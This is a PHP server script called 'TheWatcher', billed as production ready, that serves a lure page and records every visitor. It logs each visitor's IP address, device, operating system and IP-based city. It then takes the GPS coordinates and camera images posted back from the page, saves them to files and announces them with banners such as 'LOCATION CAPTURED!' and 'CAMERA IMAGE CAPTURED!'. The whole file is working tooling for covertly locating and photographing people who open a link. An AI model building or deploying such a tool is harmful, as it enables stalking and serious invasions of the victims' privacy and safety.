<?php
/**
 * TheWatcher PHP Server - Production Ready
 */

// Create necessary directories
if (!is_dir('data')) mkdir('data', 0755, true);
if (!is_dir('templates')) mkdir('templates', 0755, true);

// Set headers
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

// Handle preflight
if ($_SERVER['REQUEST_METHOD'] == 'OPTIONS') {
    http_response_code(200);
    exit();
}

$request_uri = $_SERVER['REQUEST_URI'];
$request_method = $_SERVER['REQUEST_METHOD'];
$request_uri = strtok($request_uri, '?');

// Get client IP
function getClientIP() {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
    if (strpos($ip, ',') !== false) {
        $ip = explode(',', $ip)[0];
    }
    return trim($ip);
}

// Log to STDERR
function logToStderr($type, $data) {
    $timestamp = date('Y-m-d H:i:s');
    
    if ($type == 'visit') {
        $output = "\n" . str_repeat("═", 70) . "\n";
        $output .= "🔴 NEW VISITOR DETECTED!\n";
        $output .= str_repeat("═", 70) . "\n";
        $output .= "  📅 Time:     " . $timestamp . "\n";
        $output .= "  🌐 IP:       " . $data['ip'] . "\n";
        $output .= "  📱 Device:   " . $data['device'] . "\n";
        $output .= "  💻 OS:       " . $data['os'] . "\n";
        $output .= "  🌍 Browser:  " . $data['browser'] . "\n";
        $output .= "  🏙️ City:     " . $data['city'] . "\n";
        $output .= "  🇺🇸 Country:  " . $data['country'] . "\n";
        $output .= str_repeat("═", 70) . "\n";
        file_put_contents('php://stderr', $output);
    }
    elseif ($type == 'location') {
        $output = "\n" . str_repeat("═", 70) . "\n";
        $output .= "📍 LOCATION CAPTURED!\n";
        $output .= str_repeat("═", 70) . "\n";
        $output .= "  📅 Time:     " . $timestamp . "\n";
        $output .= "  🌐 IP:       " . $data['ip'] . "\n";
        $output .= "  📍 GPS:      " . $data['lat'] . ", " . $data['lng'] . "\n";
        $output .= "  🎯 Accuracy: " . $data['accuracy'] . " meters\n";
        $output .= "  🗺️ Maps:     " . $data['maps_url'] . "\n";
        $output .= "  📱 Device:   " . $data['device'] . "\n";
        $output .= "  💻 OS:       " . $data['os'] . "\n";
        $output .= "  🌍 Browser:  " . $data['browser'] . "\n";
        $output .= "  🏙️ City:     " . $data['city'] . "\n";
        $output .= "  🇺🇸 Country:  " . $data['country'] . "\n";
        $output .= "  💾 Saved:    " . $data['file'] . "\n";
        $output .= str_repeat("═", 70) . "\n";
        file_put_contents('php://stderr', $output);
    }
    elseif ($type == 'camera') {
        $output = "\n" . str_repeat("═", 70) . "\n";
        $output .= "📸 CAMERA IMAGE CAPTURED!\n";
        $output .= str_repeat("═", 70) . "\n";
        $output .= "  📅 Time:     " . $timestamp . "\n";
        $output .= "  🌐 IP:       " . $data['ip'] . "\n";
        $output .= "  📱 Device:   " . $data['device'] . "\n";
        $output .= "  💻 OS:       " . $data['os'] . "\n";
        $output .= "  🌍 Browser:  " . $data['browser'] . "\n";
        $output .= "  🏙️ City:     " . $data['city'] . "\n";
        $output .= "  🇺🇸 Country:  " . $data['country'] . "\n";
        $output .= "  💾 Saved:    " . $data['file'] . "\n";
        $output .= "  📸 Size:     " . $data['size'] . " KB\n";
        $output .= str_repeat("═", 70) . "\n";
        file_put_contents('php://stderr', $output);
    }
}

// Parse user agent
function parseUserAgent($ua) {
    $ua_lower = strtolower($ua);
    
    $os = 'Unknown';
    if (strpos($ua_lower, 'android') !== false) $os = 'Android';
    elseif (strpos($ua_lower, 'iphone') !== false) $os = 'iOS';
    elseif (strpos($ua_lower, 'ipad') !== false) $os = 'iPadOS';
    elseif (strpos($ua_lower, 'windows') !== false) {
        if (strpos($ua_lower, 'windows nt 10') !== false) $os = 'Windows 10';
        elseif (strpos($ua_lower, 'windows nt 11') !== false) $os = 'Windows 11';
        else $os = 'Windows';
    }
    elseif (strpos($ua_lower, 'mac') !== false) $os = 'macOS';
    elseif (strpos($ua_lower, 'linux') !== false) $os = 'Linux';
    
    $browser = 'Unknown';
    if (strpos($ua_lower, 'chrome') !== false && strpos($ua_lower, 'edg') === false && strpos($ua_lower, 'opr') === false) $browser = 'Chrome';
    elseif (strpos($ua_lower, 'firefox') !== false) $browser = 'Firefox';
    elseif (strpos($ua_lower, 'safari') !== false && strpos($ua_lower, 'chrome') === false) $browser = 'Safari';
    elseif (strpos($ua_lower, 'edg') !== false) $browser = 'Edge';
    elseif (strpos($ua_lower, 'opr') !== false || strpos($ua_lower, 'opera') !== false) $browser = 'Opera';
    
    $device = 'Desktop';
    if (strpos($ua_lower, 'mobile') !== false && strpos($ua_lower, 'ipad') === false) $device = 'Mobile Phone';
    elseif (strpos($ua_lower, 'tablet') !== false || strpos($ua_lower, 'ipad') !== false) $device = 'Tablet';
    
    $device_model = '';
    if ($device == 'Mobile Phone') {
        if (strpos($ua_lower, 'iphone') !== false) $device_model = 'iPhone';
        elseif (strpos($ua_lower, 'samsung') !== false) $device_model = 'Samsung';
        elseif (strpos($ua_lower, 'xiaomi') !== false) $device_model = 'Xiaomi';
        elseif (strpos($ua_lower, 'oneplus') !== false) $device_model = 'OnePlus';
        elseif (strpos($ua_lower, 'google') !== false) $device_model = 'Pixel';
        else $device_model = 'Unknown';
    }
    
    return ['os' => $os, 'browser' => $browser, 'device' => $device, 'device_model' => $device_model];
}

// Get geo from IP
function getGeoFromIp($ip) {
    if ($ip == '127.0.0.1' || $ip == '::1' || strpos($ip, '192.168.') === 0 || strpos($ip, '10.') === 0 || strpos($ip, '172.') === 0) {
        return ['country' => 'Local Network', 'city' => 'Local', 'region' => 'N/A', 'isp' => 'Local', 'flag' => '🏠'];
    }
    
    $url = "http://ip-api.com/json/{$ip}";
    $response = @file_get_contents($url);
    
    if ($response) {
        $data = json_decode($response, true);
        if ($data && isset($data['status']) && $data['status'] == 'success') {
            $flags = [
                'Tanzania' => '🇹🇿', 'United States' => '🇺🇸', 'United Kingdom' => '🇬🇧',
                'Germany' => '🇩🇪', 'France' => '🇫🇷', 'Italy' => '🇮🇹', 'Spain' => '🇪🇸',
                'Brazil' => '🇧🇷', 'India' => '🇮🇳', 'China' => '🇨🇳', 'Japan' => '🇯🇵',
                'South Korea' => '🇰🇷', 'Russia' => '🇷🇺', 'Australia' => '🇦🇺', 'Canada' => '🇨🇦',
                'Mexico' => '🇲🇽', 'Netherlands' => '🇳🇱', 'Sweden' => '🇸🇪', 'Norway' => '🇳🇴'
            ];
            $country = $data['country'] ?? 'Unknown';
            $flag = $flags[$country] ?? '🌍';
            
            return [
                'country' => $country,
                'city' => $data['city'] ?? 'Unknown',
                'region' => $data['regionName'] ?? 'Unknown',
                'isp' => $data['isp'] ?? 'Unknown',
                'flag' => $flag
            ];
        }
    }
    
    return ['country' => 'Unknown', 'city' => 'Unknown', 'region' => 'Unknown', 'isp' => 'Unknown', 'flag' => '🌍'];
}

// Serve the main template
if ($request_uri == '/' && file_exists('templates/current.html')) {
    $ip = getClientIP();
    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
    $device_info = parseUserAgent($user_agent);
    $geo_info = getGeoFromIp($ip);
    
    $device_string = $device_info['device'];
    if ($device_info['device_model'] && $device_info['device'] == 'Mobile Phone') {
        $device_string = $device_info['device_model'] . ' ' . $device_info['device'];
    }
    
    logToStderr('visit', [
        'ip' => $ip,
        'device' => $device_string,
        'os' => $device_info['os'],
        'browser' => $device_info['browser'],
        'city' => $geo_info['city'],
        'country' => $geo_info['flag'] . ' ' . $geo_info['country']
    ]);
    
    header('Content-Type: text/html; charset=utf-8');
    readfile('templates/current.html');
    exit();
}

// Handle location endpoint
if ($request_uri == '/location' && $request_method == 'POST') {
    $input = file_get_contents('php://input');
    $data = json_decode($input, true);
    
    if ($data) {
        $ip = getClientIP();
        $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
        $device_info = parseUserAgent($user_agent);
        $geo_info = getGeoFromIp($ip);
        
        $filename = 'data/location_' . time() . '.json';
        $lat = $data['lat'] ?? null;
        $lng = $data['lng'] ?? null;
        $maps_url = ($lat && $lng) ? "https://www.google.com/maps?q={$lat},{$lng}" : '';
        
        $result = [
            'timestamp' => date('Y-m-d H:i:s'),
            'ip_address' => $ip,
            'coordinates' => [
                'latitude' => $lat,
                'longitude' => $lng,
                'accuracy' => $data['acc'] ?? 0,
                'google_maps_url' => $maps_url
            ],
            'device' => $device_info,
            'network' => $geo_info,
            'user_agent' => $user_agent
        ];
        
        file_put_contents($filename, json_encode($result, JSON_PRETTY_PRINT));
        
        $device_string = $device_info['device'];
        if ($device_info['device_model'] && $device_info['device'] == 'Mobile Phone') {
            $device_string = $device_info['device_model'] . ' ' . $device_info['device'];
        }
        
        logToStderr('location', [
            'ip' => $ip,
            'lat' => $lat ?? 'N/A',
            'lng' => $lng ?? 'N/A',
            'accuracy' => $data['acc'] ?? 0,
            'maps_url' => $maps_url,
            'device' => $device_string,
            'os' => $device_info['os'],
            'browser' => $device_info['browser'],
            'city' => $geo_info['city'],
            'country' => $geo_info['flag'] . ' ' . $geo_info['country'],
            'file' => $filename
        ]);
        
        header('Content-Type: application/json');
        echo json_encode(['status' => 'ok', 'file' => $filename]);
        exit();
    }
    
    http_response_code(400);
    echo json_encode(['error' => 'Invalid data']);
    exit();
}

// Handle camera endpoint
if ($request_uri == '/camera' && $request_method == 'POST') {
    if (isset($_FILES['image']) && $_FILES['image']['error'] == UPLOAD_ERR_OK) {
        $filename = 'data/camera_' . time() . '.jpg';
        move_uploaded_file($_FILES['image']['tmp_name'], $filename);
        
        $ip = getClientIP();
        $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
        $device_info = parseUserAgent($user_agent);
        $geo_info = getGeoFromIp($ip);
        $file_size = round(filesize($filename) / 1024);
        
        $device_string = $device_info['device'];
        if ($device_info['device_model'] && $device_info['device'] == 'Mobile Phone') {
            $device_string = $device_info['device_model'] . ' ' . $device_info['device'];
        }
        
        logToStderr('camera', [
            'ip' => $ip,
            'device' => $device_string,
            'os' => $device_info['os'],
            'browser' => $device_info['browser'],
            'city' => $geo_info['city'],
            'country' => $geo_info['flag'] . ' ' . $geo_info['country'],
            'file' => $filename,
            'size' => $file_size
        ]);
        
        header('Content-Type: application/json');
        echo json_encode(['status' => 'ok', 'file' => $filename]);
        exit();
    }
    
    http_response_code(400);
    echo json_encode(['error' => 'No image uploaded']);
    exit();
}

// Serve static files (videos, images)
if (preg_match('/\.(mp4|webm|mov|jpg|jpeg|png|gif)$/i', $request_uri) && file_exists('.' . $request_uri)) {
    $file = '.' . $request_uri;
    $mime = mime_content_type($file);
    header('Content-Type: ' . $mime);
    header('Content-Length: ' . filesize($file));
    header('Cache-Control: no-cache');
    readfile($file);
    exit();
}

// Favicon
if ($request_uri == '/favicon.ico') {
    http_response_code(204);
    exit();
}

// Default
if (file_exists('templates/current.html')) {
    header('Content-Type: text/html; charset=utf-8');
    readfile('templates/current.html');
} else {
    echo "TheWatcher v2.0 - Ready\n";
}
exit();
?>
